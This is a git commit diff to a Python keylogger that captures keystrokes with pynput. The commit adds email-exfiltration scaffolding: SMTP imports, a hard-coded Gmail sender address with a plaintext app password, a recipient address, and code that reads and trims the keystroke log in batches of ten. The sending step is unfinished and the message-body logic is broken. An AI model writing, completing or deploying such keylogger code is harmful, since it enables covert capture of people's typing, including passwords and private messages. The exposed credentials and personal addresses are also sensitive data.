fe194e631c3d56a8d6cd722d48245a2e64a36b90
DillTheBeast <dillonmaltese@gmail.com>
2023-08-18 14:45:45 -0400

    asd

--- KeyLogger.py
+++ KeyLogger.py
@@ -1,4 +1,14 @@
 from pynput import keyboard
+from email.message import EmailMessage
+import ssl
+import smtplib
+
+emailer = "logger274@gmail.com"
+emailerPassword = "aaybvlfbvjdjafsv"
+receiver = "ariellewmaltese@gmail.com"
+
+subject = ('Key Logger')
+
 
 def keyPressed(key):
     print(str(key))
@@ -9,7 +19,21 @@ def keyPressed(key):
         except:
             print('Error getting char')
 
+    with open("keyfile.txt", "r") as logFile:
+        lines = logFile.readlines()
+
+        if len(lines) >= 10:
+            for i in range(10):
+                body = f"{body} "
+            for i in range(10):
+                del lines[10 - i - 1]
+
+        with open("keyfile.txt", "w") as logFile:
+            logFile.writelines(lines)
+
+
 if __name__ == '__main__':
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
     input()
+
